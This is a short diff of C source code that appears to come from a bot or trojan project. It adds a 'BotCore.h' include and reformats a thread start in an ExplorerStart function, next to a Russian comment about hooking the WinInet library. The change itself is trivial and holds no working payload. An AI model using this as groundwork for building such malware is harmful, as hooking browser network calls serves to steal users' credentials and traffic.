@@ -7,6 +7,7 @@
 #include "Loader.h"
 #include "Pipes.h"
 #include "BotHosts.h"
+#include "BotCore.h"
 
 #include "Modules.h"
 
@@ -62,7 +63,7 @@ void ExplorerStart(PEventData Data)
 	#endif
 
 	#ifdef JAVS_PATCHERH
-		StartThread(Run_Path,NULL);
+		StartThread(Run_Path, NULL);
 	#endif
 
 	// Хукаем библиотеку WinInet
